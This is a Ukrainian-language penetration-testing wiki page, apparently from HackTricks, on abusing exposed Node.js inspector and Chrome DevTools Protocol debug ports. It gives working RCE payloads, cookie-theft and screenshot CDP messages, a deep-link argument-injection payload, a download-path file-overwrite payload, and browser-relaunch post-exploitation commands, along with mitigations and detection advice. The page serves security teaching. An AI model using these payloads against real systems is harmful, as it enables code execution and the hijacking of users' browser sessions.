# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Історичні практичні приклади включають розбір Multimaster і атаку на debugger Visual Studio Code CVE-2019-1414; використовуйте їх як контекст для конкретних версій, а не припускайте, що в кожній сучасній цілі на Electron або Chromium доступні ті самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): Після запуску з параметром `--inspect` процес Node.js очікує на підключення клієнта для налагодження. **За замовчуванням** він слухатиме на хості й порту **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Клієнти Inspector мають знати й указати адресу хоста, порт і UUID для підключення. Повна URL-адреса матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього порту, потенційно здатен виконувати довільний код від імені процесу Node.js (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Запустити Inspector можна кількома способами:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Коли ви запускаєте процес для інспектування, з’явиться щось на кшталт:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкривати debugger за допомогою `--remote-debugging-port=9222`. Це відкриває браузер через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через інспектор Node.js, тому payloads на основі `process` у Node.js за замовчуванням не застосовуються напряму.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер у режимі налагодження, з’явиться щось на кшталт цього:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Перелік і керування кінцевою точкою CDP

HTTP-кінцеві точки виявлення розрізняють WebSocket **browser** від WebSocket окремих **target** (вкладок, воркерів, розширень тощо). Надішліть запит до `/json/version`, щоб отримати кінцеву точку браузера, а до `/json/list` — щоб отримати список target; повернуті значення `webSocketDebuggerUrl` можна використовувати безпосередньо для керування за допомогою повідомлень CDP, подібних до JSON-RPC.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Наприклад, під’єднайтеся за допомогою `websocat "$BROWSER_WS"` і надішліть `{"id":1,"method":"Target.getTargets"}` або `{"id":2,"method":"Storage.getCookies"}`. Для цілі сторінки (`websocat "$PAGE_WS"`) метод `Runtime.evaluate` виконується в її renderer, а `Page.captureScreenshot` повертає скриншот у кодуванні base64. `document.cookie` не може показати cookies з прапорцем `HttpOnly`, тоді як `Storage.getCookies` запитує cookie store браузера.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Браузери, WebSockets і політика одного джерела <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веббраузері, можуть надсилати запити WebSocket і HTTP відповідно до моделі безпеки браузера. **Початкове HTTP-з’єднання** потрібне, щоб **отримати унікальний ідентифікатор сеансу debugger**. **Політика одного джерела** **не дозволяє** вебсайтам створювати **це HTTP-з’єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, що **заголовки 'Host'** з’єднання містять або **IP-адресу**, або саме **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ці **заходи безпеки запобігають експлуатації inspector** для виконання коду **простим надсиланням HTTP-запиту** (це можна було б зробити, експлуатуючи вразливість SSRF).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Можна надіслати сигнал **SIGUSR1** запущеному процесу nodejs, щоб він **запустив inspector** на порту за замовчуванням. Однак для цього потрібні достатні привілеї, тож це може надати **привілейований доступ до інформації всередині процесу**, але не забезпечує безпосереднього підвищення привілеїв.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Це корисно в контейнерах, оскільки **зупинити процес і запустити новий** з `--inspect` **неможливо**, адже **контейнер** буде **зупинено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Щоб підключитися до браузера на базі **Chromium**, можна відкрити URL `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Натиснувши кнопку Configure, слід переконатися, що **цільовий хост і порт** вказані правильно. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після цього з’явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Підключення до inspector/debugger: Щоб підключитися до браузера на базі Chromium, ...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити інспектори**, запущені локально, та **ін’єктувати в них код**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Зверніть увагу: **експлойти NodeJS RCE не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE у NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви шукаєте, як отримати [**RCE через XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Ось кілька поширених способів отримати **RCE**, якщо є змога **підключитися** до Node **inspector** (схоже, це **не працюватиме при підключенні через Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Ви можете переглянути API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я просто перелічу цікаві речі, які, як я бачив, використовували для експлуатації цього протоколу.

### Обмеження для профілю за замовчуванням у Chrome 136+

Починаючи з **Chrome 136**, Chrome ігнорує `--remote-debugging-port` і `--remote-debugging-pipe`, якщо вони вказують на **каталог даних Chrome за замовчуванням**. Ці параметри потрібно використовувати разом із нестандартним `--user-data-dir`: окремий ключ шифрування та ізольований стан браузера не дають простій техніці з прапорцем розкрити звичайний автентифікований профіль користувача. Не слід вважати, що це обмеження, специфічне для Chrome, поширюється на старіші версії Chrome, Chrome for Testing, застосунки Electron/CEF або інші похідні від Chromium без перевірки.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Тому наявність запущеного процесу Chrome, якому передано лише `--remote-debugging-port`, **не** доводить, що CDP активувався. Перевірте наявність listener-а та `/json/version`, а також з’ясуйте, який саме профіль він використовує.<sup>[[14]](#references)</sup>

### Ін’єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) дослідники Rhino Security виявили, що застосунок на основі CEF зареєстрував у системі власний URI (`workspaces://index.html`), який отримував повний URI, а потім **запускав застосунок на основі CEF** із конфігурацією, частково сформованою на основі цього URI.<sup>[[8]](#references)</sup>

Виявилося, що параметри URI декодувалися з URL-кодування та використовувалися для запуску базового застосунку CEF, що давало змогу користувачеві **ін’єктувати** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні команди.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Запустить calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, у якій **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **вихідний код** програми своїм **шкідливим кодом**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE та ексфільтрація

STAR Labs показала, що відкриті служби WebDriver/CDP можуть дозволити довільне читання файлів і RCE; у деяких конфігураціях DNS rebinding може завершити ланцюжок експлуатації.<sup>[[9]](#references)</sup>

Служба WebDriver у ChromeDriver відрізняється від Chrome DevTools/CDP. Її capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) задає виконуваний файл браузера, який запускається для нової сесії. Якщо непривілейований користувач може звернутися до служби ChromeDriver, що працює від root, і створити сесію, указавши контрольований ним шлях до виконуваного файла, запуск може перетнути межу привілеїв служби. Порожня відповідь `/sessions` не дає змоги визначити, чи можна створювати нові сесії. Перш ніж робити висновок, що цей шлях доступний, перевірте власника процесу, фактичну доступність слухача, авторизацію сесій, доступ до виконуваного файла та механізми ізоляції; самої назви процесу або типового порту недостатньо. [Google's security guidance](https://developer.chrome.com/docs/chromedriver/security-considerations) радить запускати ChromeDriver від непривілейованого облікового запису. Пасивне перерахування не повинно створювати сесію WebDriver.

Історичні випадки з автоматизацією браузера та безпекою Chromium описані в матеріалі Counter WebDriver і проблемах Project Zero 773, 1742 та 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Увімкнення CDP у запущеному процесі Chromium

У Windows [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) продемонстрував, що обмеження командного рядка — не єдиний спосіб активувати CDP: код, здатний впроваджуватися в запущений `msedge.exe`, може викликати неекспортовану функцію Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` і відкрити доступ до автентифікованого активного профілю без перезапуску браузера.<sup>[[15]](#references)</sup>

Продемонстрований ланцюжок впроваджує DLL за допомогою `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, визначає внутрішні символи Edge (спочатку за PDB, а потім за сигнатурами байтів, специфічними для версії), встановлює підклас вікна браузера та надсилає повідомлення, щоб фінальний виклик запуску сервера виконався в **UI thread** браузера. Сокет прив’язується до loopback, після чого стандартні примітиви CDP дають змогу отримувати cookies, знімати вкладки, переглядати мережевий трафік або виконувати JavaScript на автентифікованих сторінках.<sup>[[15]](#references)</sup>

> [!WARNING]
> Це техніка **post-compromise/process-injection**, а не обхід мережевої автентифікації. Вона сильно залежить від збірки, оскільки відповідні символи C++ не експортуються, а сигнатури можуть змінюватися після оновлень браузера.<sup>[[15]](#references)</sup>

Для виявлення не покладайтеся лише на телеметрію командного рядка `--remote-debugging-*`: також зіставляйте незвичні дескриптори та операції з пам’яттю процесів браузера (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, створення потоків), DLL injection і неочікувані слухаючі сокети loopback, власниками яких є Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

У реальному середовищі, **після компрометації** ПК користувача, який працює з браузером на базі Chromium, історична техніка полягала в повторному запуску браузера з увімкненим debugging і перенаправленні loopback-порту. Це може відкрити стан браузера жертви в продуктах/збірках, які й досі приймають вибраний профіль, але Chrome 136+ не застосує цей спосіб до стандартного каталогу даних.<sup>[[7]](#references)[[14]](#references)</sup>

Нижче наведено оригінальну команду повторного запуску для старих або версійно-залежних цілей. Друга команда — підтримуваний варіант для поточного Chrome, але вона створює ізольований профіль, а не відкриває звичайний автентифікований стан жертви.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Для специфічних для macOS методів перезапуску Chromium, роботи з розширеннями та CDP див. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент для перевірки та експлуатації налагоджувача CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: віддалене виконання коду у Visual Studio Code через налагоджувач Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник з налагодження Node.js — Початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Протокол Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт про corCTF 2021 — saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: зловживання функцією налагодження Chrome для віддаленого спостереження за сеансами перегляду вебсторінок і керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Ти зі мною розмовляєш? Віддалене виконання коду через WebDriver за допомогою DNS rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver — від бота до віддаленого виконання коду](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Проблема 773 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Проблема 1742 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Проблема 1944 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Зміни у параметрах віддаленого налагодження для підвищення безпеки — Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Впровадження CDP у запущений браузер Edge: детальний огляд інструментування браузера під час виконання](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
